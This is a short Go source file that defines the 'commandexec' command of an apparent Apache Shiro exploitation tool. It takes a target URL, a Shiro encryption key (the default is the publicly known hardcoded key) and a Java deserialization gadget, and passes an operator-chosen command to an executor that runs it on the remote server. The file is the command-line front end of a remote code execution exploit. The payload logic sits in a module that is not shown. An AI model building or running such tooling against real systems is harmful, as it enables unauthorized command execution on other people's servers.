package cmd

import (
	"DearShiro_GO/core/exec"
	"github.com/spf13/cobra"
)

var gadgetExecCmd = &cobra.Command{
	Use:   "commandexec [url]",
	Short: "use the gadget to exec command",
	Args:  cobra.MinimumNArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		rawUrl := args[0]
		executor := &exec.CommandExecutor{
			TargetUrl: rawUrl,
			Key:       key,
			Gadget:    gadget,
		}
		executor.Exec(command)
	},
}

func init() {
	rootCmd.AddCommand(gadgetExecCmd)
	gadgetExecCmd.Flags().StringVarP(&key, "key", "k", "kPH+bIxk5D2deZiIxcaaaA==", "The shiro key")
	gadgetExecCmd.Flags().StringVarP(&gadget, "gadget", "g", "NoCC", "The serial gadget")
	gadgetExecCmd.Flags().StringVarP(&command, "command", "c", "", "The command want to execute (necessary)")
	_ = gadgetExecCmd.MarkFlagRequired("command")
}
